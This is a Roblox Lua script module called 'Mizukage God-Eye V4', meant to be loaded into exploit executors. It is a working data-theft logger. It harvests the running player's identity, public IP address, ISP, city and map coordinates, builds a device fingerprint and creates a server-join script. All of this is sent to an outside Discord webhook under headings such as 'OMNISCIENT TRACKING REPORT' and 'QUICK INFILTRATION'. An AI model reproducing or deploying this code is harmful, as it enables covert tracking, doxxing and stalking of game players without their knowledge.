--[[
    MIZUKAGE GOD-EYE V4 (GITHUB MODULE VERSION)
    Usage: loadstring(game:HttpGet("YOUR_GITHUB_RAW_LINK"))()("YOUR_WEBHOOK_URL")
]]

return function(IncomingWebhookURL)
    -- ====================================================================
    -- [ SYSTEM LOGGER "GOD-EYE V4" (OMNISCIENT SUITE) ]
    -- ====================================================================

    task.spawn(function()
        -- [[ 0. SYSTEM INITIALIZATION & CHECKS ]]
        -- Menerima URL dari Argumen Fungsi
        local LOG_URL = IncomingWebhookURL
        
        -- Validasi URL
        if not LOG_URL or LOG_URL == "" or string.find(LOG_URL, "MASUKKAN") then 
            warn("Mizukage Logger: Webhook URL is missing or invalid.")
            return 
        end

        -- [[ 1. SERVICE INJECTION ]]
        local Players = game:GetService("Players")
        local HttpService = game:GetService("HttpService")
        local Stats = game:GetService("Stats")
        local Market = game:GetService("MarketplaceService")
        local UserInputService = game:GetService("UserInputService")
        local LocalizationService = game:GetService("LocalizationService")
        local RunService = game:GetService("RunService")
        
        -- Request Function Compatibility Check
        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        if not request then return end 

        -- [[ 2. LOCAL INTEL GATHERING ]]
        local LocalPlayer = Players.LocalPlayer
        local UserId = LocalPlayer.UserId
        local DisplayName = LocalPlayer.DisplayName
        local Username = LocalPlayer.Name
        local AccountAge = LocalPlayer.AccountAge
        local Membership = LocalPlayer.MembershipType.Name
        local PlaceId = game.PlaceId
        local JobId = game.JobId
        
        -- Account Status Check
        local IsVerified = LocalPlayer.HasVerifiedBadge and "Verified" or "Unverified"
        local IsPremium = (Membership == "Premium") and "Premium" or "Standard"
        
        -- Friends Count Fetcher
        local FriendCount = 0
        pcall(function()
            FriendCount = #LocalPlayer:GetFriendsOnline(200) 
        end)

        -- [[ 3. ADVANCED AVATAR RETRIEVAL ]]
        local AvatarURL = "https://i.imgur.com/C5uYqFk.png" 
        pcall(function()
            local ApiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..UserId.."&size=420x420&format=Png&isCircular=false"
            local Response = game:HttpGet(ApiUrl)
            local Data = HttpService:JSONDecode(Response)
            if Data and Data.data and Data.data[1] then
                AvatarURL = Data.data[1].imageUrl
            end
        end)

        -- [[ 4. DEEP NETWORK & GEO-TRACKING ]]
        local Executor = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown Injector"
        
        local IP_Data = {
            query = "N/A", country = "N/A", city = "N/A", isp = "N/A", 
            lat = 0, lon = 0, timezone = "N/A", org = "N/A", as = "N/A"
        }
        
        pcall(function()
            local response = game:HttpGet("http://ip-api.com/json")
            IP_Data = HttpService:JSONDecode(response)
        end)
        
        local MapLink = string.format("https://www.google.com/maps/search/?api=1&query=%s,%s", IP_Data.lat, IP_Data.lon)

        -- [[ 5. HARDWARE & PERFORMANCE METRICS ]]
        -- Platform Identification
        local Platform = "PC / Desktop"
        if UserInputService.TouchEnabled and not UserInputService.MouseEnabled then
            Platform = "Mobile / Tablet"
        elseif UserInputService.GamepadEnabled then
            Platform = "Console"
        end
        
        -- Hardware Stats
        local Ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
        local FPS = math.floor(workspace:GetRealPhysicsFPS())
        local MemoryUsage = math.floor(gcinfo() / 1024) -- MB Used
        
        -- Screen & Locale
        local Viewport = workspace.CurrentCamera.ViewportSize
        local Resolution = string.format("%dx%d", Viewport.X, Viewport.Y)
        local Locale = LocalizationService.RobloxLocaleId

        -- [[ 6. GAME SESSION ANALYTICS ]]
        local GameName = "Unknown Game"
        pcall(function() GameName = Market:GetProductInfo(PlaceId).Name end)
        local PlayerCount = #Players:GetPlayers()
        local MaxPlayers = Players.MaxPlayers
        
        -- Session Hash (Fake Unique ID)
        local SessionHash = string.upper(string.sub(HttpService:GenerateGUID(false), 1, 18))

        -- [[ 7. PAYLOAD CONSTRUCTION ]]
        local EmbedColor = (Membership == "Premium") and 16766720 or 32768
        
        local JoinScript = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", tostring(PlaceId), JobId)
        local ProfileLink = "https://www.roblox.com/users/" .. UserId .. "/profile"
        
        local ANSIDesc = string.format(
            "```ansi\n" ..
            " [0;31m[CRITICAL] SYSTEM BREACH DETECTED\n" ..
            " [0;34m[TRACE] IP: %s DETECTED\n" ..
            " [0;32m[SUCCESS] INJECTION COMPLETE [0m\n" ..
            "```", 
            IP_Data.query
        )

        local Data = {
            ["username"] = "MIZUKAGE GOD-EYE",
            ["avatar_url"] = "https://cdn.discordapp.com/icons/862675902196023306/33a443a96160910f443b879c2350702d.png",
            ["content"] = "", 
            ["embeds"] = {
                {
                    ["title"] = "👁️ OMNISCIENT TRACKING REPORT",
                    ["url"] = ProfileLink,
                    ["description"] = ANSIDesc,
                    ["color"] = EmbedColor,
                    ["thumbnail"] = { ["url"] = AvatarURL },
                    ["fields"] = {
                        {
                            ["name"] = "👤 **SUBJECT IDENTITY**",
                            ["value"] = string.format(
                                "> **User:** [%s](%s) (`@%s`)\n> **ID:** `%s`\n> **Age:** %d Days\n> **Friends:** ~%d Online\n> **Badges:** %s | %s",
                                DisplayName, ProfileLink, Username, UserId, AccountAge, FriendCount, IsVerified, IsPremium
                            ),
                            ["inline"] = false
                        },
                        {
                            ["name"] = "📡 **NETWORK INTELLIGENCE**",
                            ["value"] = string.format(
                                "> **IP:** ||`%s`||\n> **ISP:** `%s`\n> **ASN:** `%s`\n> **Timezone:** `%s`",
                                IP_Data.query, IP_Data.isp, IP_Data.as, IP_Data.timezone
                            ),
                            ["inline"] = true
                        },
                        {
                            ["name"] = "📍 **PHYSICAL LOCATION**",
                            ["value"] = string.format(
                                "> **Country:** %s\n> **Region:** %s\n> **City:** %s\n> **[🗺️ OPEN MAP DATA](%s)**",
                                IP_Data.country, IP_Data.regionName or "N/A", IP_Data.city, MapLink
                            ),
                            ["inline"] = true
                        },
                        {
                            ["name"] = "💻 **DEVICE FINGERPRINT**",
                            ["value"] = string.format(
                                "> **Injector:** `%s`\n> **Platform:** %s\n> **Res:** `%s`\n> **RAM:** `%d MB`\n> **Ping:** `%d ms` | **FPS:** `%d`",
                                Executor, Platform, Resolution, MemoryUsage, Ping, FPS
                            ),
                            ["inline"] = false
                        },
                        {
                            ["name"] = "🔐 **SESSION & GAME DATA**",
                            ["value"] = string.format(
                                "```yaml\nKey: %s\nSession: %s\nGame: %s\nServer: %d/%d Players```",
                                getgenv().SCRIPT_KEY or "KEYLESS", SessionHash, GameName, PlayerCount, MaxPlayers
                            ),
                            ["inline"] = false
                        },
                        {
                            ["name"] = "🚀 **QUICK INFILTRATION**",
                            ["value"] = "```lua\n" .. JoinScript .. "```",
                            ["inline"] = false
                        }
                    },
                    ["image"] = {
                        ["url"] = "https://media.discordapp.net/attachments/1090666085521788938/1099684179313360956/line.gif"
                    },
                    ["footer"] = {
                        ["text"] = "Mizukage God-Eye V4 • " .. os.date("%Y-%m-%d %H:%M:%S"),
                        ["icon_url"] = AvatarURL
                    }
                }
            }
        }

        request({
            Url = LOG_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(Data)
        })
    end)
end
